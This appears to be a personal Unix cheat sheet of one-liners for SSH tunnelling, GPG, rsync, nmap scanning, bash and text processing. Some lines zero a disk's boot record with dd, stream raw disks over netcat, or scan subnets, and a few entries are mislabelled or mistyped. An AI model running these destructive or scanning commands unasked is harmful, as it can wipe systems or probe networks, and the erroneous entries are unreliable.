  +---------------+          +--------------+        +---------------+
  |       me      |---SSH---\|  PUBLICHOST  |/       |      you      |
  |     :8000 <=============================<==:8080====             |
  |               |---------/|              |\       |               |
  +---------------+          +--------------+        +---------------+
# EXAMPLE: sharing a deployed web app (remote port forwarding)
me> mkdir ./tmp/ && cd ./tmp/
me> echo "hello world" > index.html
me> python -m SimpleHTTPServer 8000
me> curl localhost:8000/index.html
hello world
me> ssh $PUBLICHOST grep GatewayPorts /etc/ssh/sshd_config
GatewayPorts yes
me> ssh -vnNTR 8080:localhost:8000 $PUBLICHOST
me> curl $PUBLICHOST:8080/index.html
hello world
you> curl $PUBLICHOST:8080/index.html
hello world

# Dynamic port forwarding
# EXAMPLE: Proxy with SOCKS 5 protocol
# A SOCKS proxy will tunnel all your traffic through an encrypted channel
$ curl -s ipinfo.io/ip
141.212.107.235
$ ssh $REMOTEHOST curl -s ipinfo.io/ip
141.212.107.123
$ ssh -vnNTD 1337 $REMOTEHOST
debug1: Local connections to LOCALHOST:1337 forwarded to remote address socks:0
$ curl --socks5 localhost:1337 ipinfo.io/ip
141.212.107.123
# Note: your web browser can also use the proxy at localhost:1337

# GPG + SSH keys
# Ref https://incenp.org/notes/2015/gnupg-for-ssh-authentication.html
echo enable-ssh-support >> ~/gpg-agent.conf
gpgconf --kill gpg-agent
gpgconf --launch gpg-agent
export SSH_AUTH_SOCK=$(gpgconf --list-dirs agent-ssh-socket)
gpg --with-keygrip --list-keys
echo KEYGRIP_OF_AUTH_SUBKEY >> ~/.gnupg/sshcontrol
brew install pinentry-mac
echo "pinentry-program /usr/local/bin/pinentry-mac" >> ~/.gnupg/gpg-agent.conf
ssh-add -l                             # verify GPG-SSH connection
gpg --export-ssh-key KEYID             # print SSH public key
echo RELOADAGENT | gpg-connect-agent   # reload gpg agent

# Intel SSH
cygwin $ export SSH_SOCKS_SERVER='socks://proxy-socks.jf.intel.com:1080'
cygwin $ ssh2.exe -L 22:localhost:22 ariel.eecs.umich.edu -s service
  # now you can use ssh or svn
cygwin $ scp file localhost: # really sends the file to ariel.eecs.umich.edu

# Tunneling
sudo openvpn myconfig.ovpn              # start VPN connection
sshuttle --dns -vvr HOST 0/0            # quick VPN over ssh

# Open an .rdp file for remote login to virtualsites
tsclient -x connect.rdp
rdesktop server:port -u awdeorio@UMICH.EDU

# File transfer
scp FILE HOST:                         # copy file to remote host over SSH
scp -r DIR HOST:                       # copy directory
rsync -avz DIR HOST:PATH/              # archive over the network
rsync -a                               # archive, equivalent to -rlptgoD
rsync -r                               # recursive
rsync -l                               # copy symlinks as symlinks
rsync -p                               # preserve permissions
rsync -t                               # preserve times
rsync -g                               # preserve group
rsync -o                               # preserve owner
rsync -D                               # preserve devices and special files
rsync -v                               # verbose
rsync -z                               # compress
rsync -P                               # progress bar
rsync -rvt                             # copy to/from USB stick
rsync --delete                         # delete files on target
rsync --filter=':- .gitignore'         # don't copy files ignored by git
rsync --exclude '.git*'                # don't copy git metadata
rsync --exclude 'folder/***'           # don't copy contents of folder
rsync -e "ssh -i KEY.pem" ubuntu@HOST: # rsync to AWS/Ubuntu
ftp HOST                               # FTP
lftp HOST                              # FTP with extra features
sftp HOST                              # FTP over SSH
tftp                                   # TFTP, e.g., for firmware flashing

# nmap
nmap HOST                               # what ports are open?  On host.
nmap 192.168.0.0/24                     # what ports are open?  Many hosts.
nmap -A                                 # OS, version, script and traceroute
nmap -T4                                # Limit delay (faster results)
nmap -sn -PR 192.168.0.0/24             # which hosts are up my subnet?
nmap -O                                 # OS detection
zenmap                                  # GUI for nmap

# Shell scripting
yes                                     # keep printing "y" over and over
yes STRING                              # keep printing STRING over and over
yes | INSTALL_CMD                       # answer yes to all installer questions
yes > FILE                              # quickly generate a big file
yes | head -c 10m > FILE                # quickly generate a 10 MB file
while true; do echo -e "hello\t1"; done | head -c 10m > FILE  # ^^^ w/contents
pv                                      # monitor progress of data thru a pipe
exit N                                  # exit N
true                                    # exit zero
false                                   # exit non-zero
tee FILE                                # copy stdin to both stdout and FILE
tee FILE1 FILE2                         # copy stdin to stdout, FILE1, FILE2
tee /dev/stderr                         # copy stdin to both stdout and stderr
echo hello | tee FILE                   # write "hello" to both stdout and FILE
mktemp                                  # create a temporary file
mktemp -t PREFIX                        # ^^^ starting with PREFIX
mktemp -d                               # create a temporary directory
mktemp -d -t hello-XXXXXXXX             # ^^^ named .../hello-1yJnQgLM
basename /bin/bash                      # returns "bash"
dirname /bin/bash                       # return "/bin"
sleep                                   # sleep (1, 1s, 1m, etc.)
seq 10 | xargs -n1 echo "hello"         # do something N times (see also {1..N})
printf                                  # C-workalike print function

# Bash shell scripting
set -Eeuo pipefail                      # Stop on errors
bash -n SCRIPT                          # Bash script syntax check
echo "hello world"                      # print stdout
echo "hello world" >&2                  # print to stderr
echo "hello world" > FILE               # print file
echo "hello world" >> FILE              # append file
echo "hello world" &>> FILE             # append stdout and stderr to file
CMD > /dev/null                         # ignore stdout
CMD 1>-                                 # ignore stdout
CMD 2> /dev/null                        # ignore stderr
CMD 2>-                                 # ignore stderr
CMD &> /dev/null                        # ignore both stdout and stderr
CMD > /dev/null 2>&1                    # ignore both stdout and stderr
CMD &>-                                 # ignore both stdout and stderr
CMD 2>&1                                # copy stderr to stdout
CMD1 2>&1 | CMD2                        # stdout + stderr -> pipe
CMD1 &| CMD2                            # stdout + stderr -> pipe
0<&-                                    # close stdin
<<TAG ... TAG                           # here document (for inline scripts)
<<-TAG ... TAG                          # ^^^ ignore leading tabs, *tabs only*
<<'TAG' ... TAG                         # ^^^ no variable expansion
cat > FILE << EOF ... EOF               # ^^^ for writing a file
<<< "STRING"                            # here string
<( CMD )                                # create a temporary named pipe
diff <(echo a) <(echo b)                # diff the output of two commands
exec > >(tee logfile.txt); exec 2>&1;   # copy stdout and stderr to log file
exec 1<&-                               # close stdout file descriptor
exec 2<&-                               # close stderr file descriptor
exec 1<>LOG_FILE                        # open stdout as LOG_FILE file for r/w
exec 2>&1                               # redirect stderr to stdout
echo "this goes to LOG_FILE, not screen # (after above 4 exec commands)
$#                                      # argc in bash
[ $# -lt 1 ] && exit 1                  # check # args and quit
$@                                      # argv in bash
$0                                      # argv[0] in bash
set -o verbose                          # echo commands to stdout
cd $(dirname "$BASH_SOURCE") && pwd -P  # absolute path of sourced script
eval                                    # run in current shell
exec                                    # spawn a new shell to replace current
TAB=$'\t'                               # TAB literal
echo "hello" | tee >(cat) >(cat)        # copy stdout to two commands
set -u                                  # error on unset variables
set -e                                  # Abort on non-zero NOTE: pipes break it
set -o pipefile                         # ^^^ for pipes
set -x                                  # Print commands
set +x                                  # Stop print commands
{ set +x; } 2>/dev/null                 # Stop print commands silently
STR=$'hello\nworld'                     # String with newlines
EXTENSION="${FILENAME##*.}"             # Parse file extension
CSVFILE="${TXTFILE%.txt}.csv"           # Change file extension
for i in $(ls *.txt); do mv $i ${i%.txt}.md; done  # Change many file extensions
IFS= read -s  -p Password: PASSWORD     # Ask user for password
for i in $(cat file); do                # for loop, word-by-word
IFS=$'\n' for i in $(cat file); do      # for loop, line-by-line
[ -z "${VAR}" ]                         # unset or set to the empty string
[ -z "${VAR+}" ]                        # unset
[ -z "${VAR-}" ]                        # set to the empty string
[ -n "${VAR}" ]                         # set to a non-empty string
[ -n "${VAR+}" ]                        # set, possibly to empty string
[ -n "${VAR-}" ]                        # either unset or set non-empty string
X=${X:=input}                           # Default value for X
hash CMD                                # return true if CMD is in PATH
echo {1..10}                            # expands to 1 2 3 ... 10 (see also seq)
printf 'a%.0s' {1..10}                  # Repeat letter 'a' 10 times
trap "FUNC" 1 2 3 15                    # run FUNC on receiving a signal
trap "kill 0" SIGINT                    # kill all proc in proc group on ctrl-c
trap cleanup SIGHUP SIGINT SIGQUIT SIGKILL SIGTERM ERR  # all but clean exit
echo $0                                 # Check your shell "-bash", "zsh", etc.

# Bash script error handling
# https://medium.com/@dirk.avery/the-bash-trap-trap-ce6083f36700
set -e
trap 'catch $? $LINENO' EXIT
catch() {
  echo "catching!"
  if [ "$1" != "0" ]; then
    # error handling goes here
    echo "Error $1 occurred on $2"
  fi
}

# Bash shell productivity
cp file{,.bak}                          # Backup a file
mv file{,.old}                          # Move a file
sudo !!                                 # Repeat last command with sudo
ls !$                                   # Last item from last cmd
ls !^                                   # First (non-cmd) item from last cmd
ls !*                                   # All (non-cmd) items from last cmd
ls -d */                                # List only directories
echo !$:h                               # Directory part of prev cmd last item
echo !$:t                               # File part of prev cmd last item
echo !$:r                               # ^^^ w/o suffix
echo !$:e                               # Remove all but the suffix
[Ctrl + r]                              # Search history
[Ctrl + g]                              # Cancel search history
[Ctrl + p]                              # Prev history command
[Ctrl + n]                              # Next history command
[Alt + .]                               # Last word on prev history command
[Ctrl + l]                              # Clear screen
[Ctrl + s]                              # Stop output to the screen
[Ctrl + q]                              # Restart output to the screen
[Ctrl + c]                              # Terminate command
[Ctrl + z]                              # Suspend command
fg                                      # Restart command in foreground
bg                                      # Restart command in background

# grep
grep PATTERN                            # search for pattern
grep -E PATTERN                         # extended regex
grep -E '(PATTERN1|PATTERN2)'           # two patterns
egrep PATTERN                           # extended regex
grep -o                                 # only print the matched pattern
grep -v                                 # invert match
grep -Ev '(PATTERN1|PATTERN2)'          # invert two matches
grep -A10                               # print match + 10 lines after
grep -B10                               # print match + 10 lines before
grep -10                                # same as grep -A10 -B10
grep -a -b -B100 -A100 phrase /dev/sda3 # recover deleted files
egrep -o "\w+([._-]\w)*@\w+([._-]\w)*\.\w{2,4}" -e  # email addresses
# grep for tab in bash: Ctrl-V TAB
grep '^.\{10\}$'                        # 10 letter words
zgrep                                   # grep gzip'ed files
fgrep                                   # fixed patterns (no regex), faster
pcregrep                                # Perl Compatible Regex
grep -P                                 # Perl regex
ptargrep                                # grep files insize a tarball

# The Silver Searcher
# https://github.com/ggreer/the_silver_searcher
# brew install the_silver_searcher
ag PATTERN                              # search for PATTERN
ag --list-file-types                    # supported filetype-specific searches
ag --python                             # Only Python files
ag -G .py                               # Filter by file extension or filename

# sed
sed -rn '/PATTERN/p'                    # grep work-a-like
sed -r                                  # use extended regex
sed 1d                                  # print all but first line
sed '$d'                                # print all but last line
sed -n '52p'                            # print line 52
sed '52q;d'                             # ^^^ efficient on large files
sed -n '45,50p' filename                # print lines 45-50
sed -n '51q;45,50p' filename            # ^^^ efficient on large files
sed -n '/BEGIN/,/END/p'                 # print lines between BEGIN and END
sed '/BEGIN/,/END/d'                    # delete lines between BEGIN and END
sed '/SENTINEL/q'                       # print lines before and incl. SENTINEL
sed -ne '/SENINTEL/,$ p'                # print lines after and incl. SENTINEL
sed -i '' 's/before/after/g'            # replace "before" with "after" (BSD)
sed -i 's/before/after/g'               # replace "before" with "after" (GNU)
sed -i .bak 's/before/after/g'          # ^^^ with backup
perl -pi -e 's/before/after/g'          # ^^^ perl alternative
sed 's/\([a-z]*\).*/\1/'                # keep only lowercase letters
sed 's/^/before/'                       # prepend every line
sed 's/$/after/'                        # append every line
sed '/before/d'                         # filter lines matching "before"
sed -nr 's/@@  ([0-9]+\.?[0-9]*) ns total time to execute/\1/p'
sed '1s/before/after/'                  # replace first line
sed -rn "s/^.*(PATTERN1).*(PATTERN2).*$/\1\t\2/p" # extract two fields
tac | sed -n '1,/PATTERN/p' | tac       # print from last match to end of file
sed '/PATTERN1/s/PATTERN2/PATTERN3/'    # match P1, then apply query-replace
perl -0pe 's/QUERY/REPLACE/sm'          # multiline regex query-replace

# awk
awk '/Iowa/,/Montana/'                  # print lines between Iowa & Montana
awk '{print $NF}'                       # print last field
awk '{print $(NF-1)}'                   # print second-to-last field
awk '{$1="";print}'                     # print all but last field
awk '$1>=2{print}                       # print if greater that 2
awk '{ sum += $1 }; END { print sum }'  # sum input stream
awk '{print length}'                    # length of each line
awk '{print length($1)}'                # length of first word
awk '{a[$1]+=$2}END{for(i in a) print i,a[i]}' # sum vals (col2) by key (col2)
awk '/match/,/*/'                       # remove from match to end of file
awk 'BEGIN { FS = "," } ; { print $2 }' # change field separator
awk '{$1=$1;print}'                     # trim whitespace
cat ips | awk 'BEGIN {FS="."}; {printf "%03d%03d%03d%03d\n", $1, $2, $3, $4}' | sort -n | awk '{printf "%d.%d.%d.%d\n", substr($0,1,3), substr($0,4,3), substr($0,7,3), substr($0,10,3)}'       # sort ips

# Misc text processing
cat FILE1                               # print file to terminal
cat FILE1 FILE2                         # Concatenate and ^^^
cat -n                                  # prepend line numbers
nl                                      # prepend line numbers
fold                                    # word-wrap text
cut -c8-                                # remove first 8 characters of a line
less FILE                               # pager.  q to quit
pygmentize -g                           # syntax highlighting, autodetect lexer
column -t                               # format columns in tabular data
column -tns, FILE.csv                   # pretty-print a csv file
test `tail -c 1 file`                   # test if file ends in newline
expand                                  # converts tabs into spaces
unexpand                                # convert spaces to tabs
tac                                     # reverse order of lines
rev                                     # reverse order of characters
paste                                   # print two files side-by-side
paste <(CMD1) <(CMD2) | column -t       # compare the output of two commands
tr "\r\n" "\n"  FILE                    # convert line endings to UNIX
tr -d '[:space:]'                       # remove whitespace
tr -d -c ',\n' | awk '{print length}'   # count commas
shuf                                    # shuffle lines
head                                    # first 10 lines
head -n2                                # first 2 lines
head -n-2                               # all but last 2 lines
tail                                    # last 10 lines
tail -n2                                # last 2 lines
tail -n+2                               # from from line 2 to end
tail -f                                 # monitor file for appends
tail -f FILE | grep --line-buffered PATTERN  # monitor FILE for PATTERN
wc                                      # word, line, character and byte count
wc -l                                   # line count
sort                                    # sort lines
sort | uniq                             # print only unique lines
sort -n                                 # numeric order
sort -u                                 # print only unique lines
sort -k1                                # sort on column 1 (first)
sort -k1-2                              # sort on columns 1 and 2
sort -k1 -t,                            # sort on col 1, comma-delimited
sort -h                                 # sort human readable, e.g., from du -h
sort -o FILE FILE                       # sort FILE in place
/usr/share/dict/words                   # All the words in the dictionary
shuf -n1 /usr/share/dict/words          # random word
split FILE                              # split FILE into 1000 line files
split -                                 # ^^^ stdin
split -l10 FILE                         # split FILE into 10 line files
csplit '/^TO:/' '{*}' -                 # split stdin, match on "TO"

# File types and file conversion
file FILE                               # determine encoding of FILE
file --mime FILE                        # determine encoding of FILE
iconv -c -f UTF-8 -t ASCII//TRANSLIT    # convert UTF8 to ASCII
recode UTF8..ASCII FILE                 # convert UTF8 to ASCII
recode ../CR-LF FILE                    # Convert newlines from Unix to DOS
recode ../Base64 FILE                   # Convert to base64
recode utf8/Base64..ASCII FILE          # Convert uft8/base64 to ASCII
fromdos                                 # convert line endings to UNIX
dos2unix                                # convert line endings to UNIX (old)
pandoc -t gfm X.html -o X.md            # HTML to GitHub flavored markdown
convert X.jpg X.png                     # JPG to PNG
in2csv X.xls > X.csv                    # XLS to CSV
tidy -im FILE.html                      # Reformat and re-indent HTML file

# CSV files
cat FILE| head -n1| tr ',' '\n'         # column labels
cat FILE| head -n1| tr ',' '\n'| cat -n # column labels and numbers
cat FILE| cut -d, -f1                   # print column 1
cat FILE| cut -d, -f1-3                 # print first 3 columns
pip install csvkit                      # install python CSV CLI utilities
in2csv                                  # xls[x] -> csv
csvlook                                 # pretty print table
csvcut -n                               # column labels and numbers
csvcut -c 2-6                           # print columns 2 - 6
csvcut -c 2,5,6                         # print columns 2,5,6
csvcut -c county,quantity               # print columns "county" and "quantity"
csvcut -c 2-5 | csvlook                 # cut and pretty print
csvstat                                 # print statistics about each column
csvgrep -c COLUMN[S] -m PATTERN         # search for PATTERN in column
csvgrep -c COLUMN[S] -r PATTERN         # search for regex PATTERN in column
csvsort -c COLUMN[S]                    # sort, keyed on COLUMN[S]
csvsort -c COLUMN[S] -r                 # ^^^ reverse sort
csvjoin -c COLUMN A.csv B.csv           # join two files on COLUMN
csvjoin -cUMID -I                       # join on UMID, with strings match
csvjoin -cUMID -I --outer roster.csv scantron.csv  # join roster w/ scantron
csvstack A.csv B.csv                    # stack https://goo.gl/CN8JaI
csvsql --db sqlite:///DB.db --insert    # CSV -> SQL https://goo.gl/9FMLf1
csvjson                                 # CSV -> JSON
csvjson --indent 4                      # CSV -> JSON pretty printed
csvjson --key COLUMN                    # build JSON lookup table
csvpy data.csv                          # Launch Python and load CSV reader lib
csvformat -T                            # CSV -> TSV

# Printing
enscript FILE                           # pretty-print text file
lpr                                     # print file
lprm -P<printer>                        # remove one job from queue
lpq  -P<printer>                        # show printer queue status
lpstat -t                               # show all status info for all printers
cupsdisable <printer>                   # stop printer
cupsenable  <printer>                   # start printer

# Filesystems
df                                      # disk free
df -h                                   # disk free, human readable
du [DIR]                                # disk usage of a directory
du -sh DIR                              # disk usage of DIR, human readable
du -shc *                               # disk usage of DIRS, with total
ncdu                                    # interactive disk usage
fsck -aC /dev/<device>                  # check disk with progress bar, no ?'s
touch /forcefsck && reboot              # force filesystem check on reboot
dd if=/dev/cdrom of=my_cd_image.iso     # Rip ISO from CDROM
mount with "shortname=mixed"            # mount FAT32
rsync -rvt --delete --modify-window=1   # copy from FAT32
rsync -rv --delete --checksum           # copy from FAT32, using file checksum
mount_webdav -i https://ctools.umich.edu/dav/group-user/1a01c844-13d4-4375-bbd8-b8ecb6e538bb /Users/awdeorio/mnt/uarts250w15-dropbox # mount a WebDav share
encfs PATH mnt/PATH                     # mount an encfs virtual drive
sshfs USER@HOST:REMOTE_DIR LOCAL_DIR    # mount REMOTE_DIR over SSH
mount -o loop file.img DIR              # mount CD/DVD image

# Disk imaging over a network
# create a backup of client to server
SERVER $ nc -p 2222 -l > FILE.img                     # start backup, server
CLIENT $ dd if=/dev/sda bs=16M | nc SERVER 2222       # start backup, client
CLIENT $ nc -p 2222 -l > /dev/sda                     # start restore, client
SERVER $ dd if=FILE.img bs=16M | nc CLIENT 2222       # start restore, server

# Back up and restore MBR excluding partition table
dd if=/dev/sda of=/home/herman/MBR.img bs=446 count=1 # backup MBR
dd if=/home/herman/MBR.img of=/dev/sda bs=446 count=1 # restore MBR
dd if=/dev/zero of=/dev/hda bs=446 count=1            # kill MBR, except table
dd if=/dev/zero of=/dev/hda bs=512 count=1            # kill ENTIRE MBR

# Permissions
chown USER                              # change owner
chown USER:GROUP                        # change owner and group
chown -R USER                           # change owner recursively
chgrp GROUP                             # change group
chgrp -R GROUP                          # change group recursively
chmod -r                                # remove read permissions
chmod -w                                # remove write permissions
chmod -x                                # remove execute permissions
chmod +r                                # add read permissions
chmod +w                                # add write permissions
chmod +x                                # add execute permissions
chmod u-rwx                             # remove rwx access for user
chmod g-rwx                             # remove rwx access for group
chmod o-rwx                             # remove rwx access for others
chmod 777                               # EVERYONE can do EVERYTHING
find . -type f -exec chmod 600 {}\;     # change permissions for files only
find . -type d -exec chmod 700 {}\;     # change permissions for dirs only
umask                                   # view mask for default file permissions
umask -S                                # ^^^ symbolically
umask 0077                              # Nobody can r/w my data
umask 0022                              # Group members can r/w my data

# AFS
kdestroy                                # delete Kerberos tickets
unlog                                   # delete AFS tokens
kinit [-5] [-l 30d] [awdeorio@UMICH.EDU]# get Kerberos ticket
aklog                                   # get AFS tokens
aklog -cell umich.edu -k UMICH.EDU      # AFS tokens for UMICH cell
aklog -cell eecs.umich.edu -k UMICH.EDU # AFS tokens for EECS cell
gssklog -cell engin.umich.edu           # AFS tokens for ENGIN cell
fs listacl [FILE|DIR]                   # list ACLs (permissions)
fs setacl -dir DIR -acl USER rlidwk     # give USER access to directory
fs quota                                # check storage quota
find DIR -type d -exec fs setacl -dir {} -acl USER rlidwk \;  # give USER access to DIR, recursively
find DIR -type d -exec fs setacl -dir {} -acl USER rlidwka \; # give USER access to DIR, recursively, with admin (note the "a")

# NFS
showmount -e 192.168.0.100              # see what's available
mount 192.168.0.100:/volume1/public nas # mount NFS volume

# CIFS
ls -l                                   # Check for extended attributes "."
getcifsacl                              # Read ACLs
setcifsacl                              # Write ACLs

# Hardware and detection
top                                     # current memory usage
free                                    # memory only
cat /proc/cpuinfo                       # CPU information
cat /proc/meminfo                       # Memory information
lspci                                   # see PCI devices
hwinfo                                  # all hardware
xinput --list                           # see available input devices
shutdown                                # shut down machine
reboot                                  # reboot machine

# Converting docs
enscript FILE.txt -o - | ps2pdf - FILE.pdf  # txt to pdf
fromdos                                 # convert line endings to UNIX
dos2unix                                # convert line endings to UNIX (old)
pdftk PATH/*.pdf cat output output.pdf  # join pages
pdfjoin *.pdf                           # join pages
pdfunite *.pdf out.pdf                  # join pages
pdftk FILE.pdf burst                    # split pages
pdfseparate FILE 'page-%02d.pdf'        # split pages
xlhtml                                  # convert excel files
pdftotext                               # convert pdf to text
pdftotext -layout                       # convert pdf to text, preserving layout
pdffonts                                # list fonts in a pdf document
pdfcrop --margins 0 INFILE OUTFILE      # Remove whitespace around pdf
pdfgrep                                 # Search text in pdf
textutil -convert txt FILE.rtf          # rtf to txt
lynx --dump FILE.html > FILE.txt        # HTML to txt
tesseract                               # OCR https://tesseract-ocr.github.io/tessdoc/Command-Line-Usage.html
tesseract INPUT OUTPUT                  # OCR, saves to OUTPUT.txt
tesseract INPUT OUTPUT pdf              # OCR, saves searchable pdf

# Date and time
date '+%s'                                        # current time in seconds
date '+%Y'                                        # current year
date '+%Y-%m-%d_%H:%M:%S'                         # format 2016-06-20_13:13:19
date --utc '+%Y-%m-%d_%H%M%S_%Z'                  # format 2016-06-20_131319_UTC
date --date='Thu Nov  4 09:08:49 EDT 2010' '+%s'  # parse a date and reformat
date --date="1970-01-01 1187769064 sec GMT"       # Unix time to human
date --date @1187769064                           # Unix time to human
TZ='America/Detroit'; export TZ                   # change time zone
ntpdate europe.pool.ntp.org north-america.pool.ntp.org # sync clock

# GNU parallel
ls *.tar.gz | parallel -v -j3 tar -xvzf # untar, 3 jobs in parallel
ls *.tar.gz | xargs -P3 tar -xvzf       # alternative using xargs
parallel --verbose                      # print cmd before executing it
parallel -v                             # print cmd+output after executing it
parallel -j+0                           # untar, use all CPUs
*/ -d | sed 's_/$__' | parallel -v -j+0 tar -cjf {}.tar.bz2 {}/ # create tar
killall -USR1 parallel                  # get list of running jobs
killall -TERM parallel                  # finish running jobs, no new jobs
echo > q; tail -f q | parallel          # start job queue
echo my_command my_arg >> q             # submit to job queue

# Hadoop
hadoop jar hadoop-streaming.jar -info   # HSI Help

# File differences
diff FILE1 FILE2                        # view differences of two files
diff <(CMD1) <(CMD2)                    # diff the output of two commands (bash)
diff3 FILE1 FILE2 FILE3                 # diff three files
sdiff                                   # same as diff --side-by-side
sdiff --suppress-common-lines           # Do not print lines that match
diff FILE1 FILE2 > patch.txt            # save a patch
patch < patch.txt                       # apply a patch from a diff
wdiff FILE1 FILE2                       # diff word-by-word
colordiff                               # same as diff, but with color
diff ... | colordiff                    # colorize diff output
wdiff ... | colordiff                   # colorize wdiff output
diff ... | colordiff | diff-highlight   # colorize character level, from Git
diff --brief -r DIR1 DIR2               # compare directories recursively
python2 -c "a=open('FILE1').read(); b=open('FILE2').read(); import sys; sys.exit(not a in b)"  # FILE1 is contained by FILE2

# Shell math
expr 1 / 2                              # integer only
let A=1/2                               # integer only
echo "1 / 2" | bc -l                    # floating point
dc -e "3 k 1 2 /p"                      # floating point
sort file1 | uniq                       # unique patterns
sort file1 file2 | uniq                 # set union
sort file1 file2 | uniq -d              # set intersection
sort file1 file2 | uniq -u              # set symmetric difference
cat FILE | sort | uniq -c               # frequency analysis (histogram)
factor NUM                              # print prime factors
st                                      # statistics about a stream of numbers

# Compression
tar -cjf DIR.tar.bz2 DIR/               # compress directory
tar -xvjf DIR.tar.bz2                   # decompress directory
tar -xvjf DIR.tar.bz2 -C DIR            # decompress to target DIR
tar -xvjOf DIR.tar.bz2                  # cat tarball files to stdout
tar -tvjf DIR.tar.bz2                   # list contents of tarball
tar -xvjf DIR.tar.bz2 FILE              # extract FILE from tarball
tar --disable-copyfile                  # avoid random dot files on OSX
tar --exclude '*__pycache__*'           # exclude Python temp files
tar -c --dereference                    # include pointee of symlinks
tar --strip=1                           # discard top level directory
zip -r DIR DIR                          # compress DIR to DIR.zip
zip --encrypt -r DIR DIR                # compress and encrypt DIR
unzip FILE.zip                          # decompress
unzip FILE.zip -d DIR                   # decompress to DIR
bzip2 FILE                              # compress
bunzip2 FILE.bz2                        # decompress
bzcat FILE.bz2                          # decompress to stdout
gzip FILE                               # compress
cat FILE.txt | gzip -f > FILE.txt.gz    # compress from stdin
gunzip FILE.gz                          # decompress
gunzip -c FILE.gz | ...                 # decompress to stdout
zcat FILE.gz                            # decompress to stdout
zgrep FILE.gz                           # grep compressed file
zdiff FILE1.gz FILE2.gz                 # diff compressed file
7za e FILE.7z                           # decompress 7 zip format (p7zip)
xz FILE                                 # compress
unxz FILE.xz                            # decompress
ag -z -G .tar.gz                        # search compressed files

# Encryption
encfs ROOTDIR MOUNTPOINT                # (first time) create encrypted virtual folder
encfs ROOTDIR MOUNTPOINT                # mount
fusermount -u MOUNTPOINT                # unmount / Linux
umount MOUNTPOINT                       # unmount / Darwin
encfsctl passwd ROOTDIR                 # change password
md5sum                                  # compute hash
shasum                                  # compute hash
shasum -a 256                           # compute hash, SHA256
openssl                                 # CLI to OpenSSL library
crypto FILE                             # encrypt to FILE.crypt
decrypto FILE.crypt                     # decrypt to FILE
shasum -c FILE                          # check SHA hash
md5sum -c FILE                          # check MD5 hash
openssl req -newkey rsa:2048 -nodes -x509 -days 365 # generate server key
openssl req -newkey rsa:4096 -nodes -x509 -days 365 # generate server key, 4096
openssl s_client -showcerts -connect www.google.com:443  # Show certificate
zip --encrypt -r DIR DIR                # create encrypted zip archive

# GPG debug
gpg --version                           # Verify version 2
gpg --list-keys                         # Verify your keypair is present
gpgconf --kill gpg-agent                # Restart gpg-agent
gpgconf --launch gpg-agent              # Restart gpg-agent
echo hello | gpg --clearsign            # Verify basic functionality

# GPG configuration
gpg --homedir ~/gnupg_tmp/              # Use another GPG config
GNUPGHOME=~/gnupg_tmp gpg               # Use another GPG config

# GPG Agent
gpgconf --kill gpg-agent                # Stop gpg-agent
gpgconf --launch gpg-agent              # Start gpg-agent
echo RELOADAGENT | gpg-connect-agent    # Reload gpg-agent

# GPG public key management
gpg -k                                  # List public keys
gpg -K                                  # List secret keys
gpg --search-keys awdeorio              # Search for public key
gpg --search-keys awdeorio --keyserver pgp.mit.edu  # Change key server
gpg --recv-key KEYID                    # Download and add public key
gpg --recv-key --keyserver pool.sks-keyservers.net  KEYID  # Change key server

# GPG create key pair
gpg --full-generate-key                 # Create GPG public/private key pair
gpg --armor --export KEYID              # Print public key
gpg --armor --export-secret-keys KEYID  # Print private key
gpg --export -a > ~/allpublickeys.asc   # Backup public keys
gpg --import < ~/allpubkeys.asc         # Restore backup of public keys
gpg --send-keys KEYID                   # Public key to public keyserver
gpg --list-options show-photos --fingerprint KEYID  # Show attached photo

# GPG asymmetric encryption (sign and seal)
gpg --encrypt --recipient awdeorio@umich.edu MESSAGE.txt  # Encrypt
gpg -e -r awdeorio@umich.edu MESSAGE.txt                  # Encrypt
gpg --decrypt MESSAGE.txt.gpg                             # Decrypt
gpg -d MESSAGE.txt.gpg                                    # Decrypt

# GPG symmetric encryption
gpg --symmetric MESSAGE.txt                               # Encrypt
gpg -c MESSAGE.txt                                        # Encrypt
gpg --decrypt MESSAGE.txt.gpg                             # Decrypt
gpg -d MESSAGE.txt.gpg                                    # Decrypt
gpg -c --batch --passphrase $KEY MESSAGE.txt              # Encrypt, pw in var
gpg -d --batch --passphrase $KEY MESSAGE.txt.gpg          # Decrypt, pw in var
gpg -c --batch --passphrase-file key.txt MESSAGE.txt      # Encrypt, pw in file
gpg -d --batch --passphrase-file key.txt MESSAGE.txt.gpg  # Decrypt, pw in file

# GPG example: encrypt a file with awdeorio's public key
curl -sSL https://andrewdeorio.com/assets/awdeorio.asc | gpg --import -
gpg --always-trust -r awdeorio -e FILE.txt
gpg -d FILE.txt.gpg > FILE.txt          # Only awdeorio can decrypt

# GPG example: encrypt a file with awdeorio's public key, long version
mkdir ~/gnupgtmp
export GNUPGHOME=~/gnupgtmp
chmod 700 $GNUPGHOME
wget https://andrewdeorio.com/assets/awdeorio.asc
gpg --import awdeorio.asc
gpg -r awdeorio -e secret.txt
unset GNUPGHOME
gpg -d secret.txt.gpg  # Only awdeorio can decrypt

# GPG example: encrypt a directory with awdeorio's public key
curl -sSL https://andrewdeorio.com/assets/awdeorio.asc | gpg --import -
tar -cz FILE | gpg --always-trust -r awdeorio -e -o FILE.tar.gz.gpg
gpg -d FILE.tar.gz.gpg | tar -xz        # Only awdeorio can decrypt

# GPG example: encrypt a file with a key
gpg -c FILE.txt                         # Encrypt with prompt for key
gpg -d FILE.txt.gpg > FILE.txt          # Decrypt with prompt for key

# GPG example: enrypt a directory with a key
tar -cz DIR/ | gpg -c -o DIR.tar.gz.gpg # Encrypt with prompt for key
gpg -d DIR.tar.gz.gpg | tar -xz         # Decrypt with prompt for key

# GPG example: sign a message with your private key.  The output will include
# the original plaintext and a signature created using your private key.  Good
# for voting by email.  Verifiable that you wrote this message.
# https://futureboy.us/pgp.html#SigningPlaintext
gpg --clearsign FILE.txt                # Sign
gpg --verify FILE.txt.asc               # Verify signed message

# GPG example: sign an executable with your private key.  The output will
# include *only* the signature create using your private key.  Good for making
# sure an executable wasn't modified.
# https://futureboy.us/pgp.html#DetachedSignature
gpg --detach-sign FILE.exe              # Sign
gpg --verify FILE.exe.sig               # Verify signed FILE.exe

# Keybase https://keybase.io/docs/the_app/install_macos
keybase help                            # Show subcommands
keybase prove twitter                   # Link a twitter account
keybase id br                           # Show info on user "br"

# Serial ports
dmesg | grep /dev/tty                   # recently connected devices
screen /dev/ttyACM0 9600                # text input/output at 9600 Baud
                                        #   Ctrl-A,Shift-K to quit
# Virtual terminals
screen                     # start virtual terminal
screen -S NAME             # start virtual terminal named NAME
screen -r NAME             # attach to NAME
screen -ls                 # list sessions
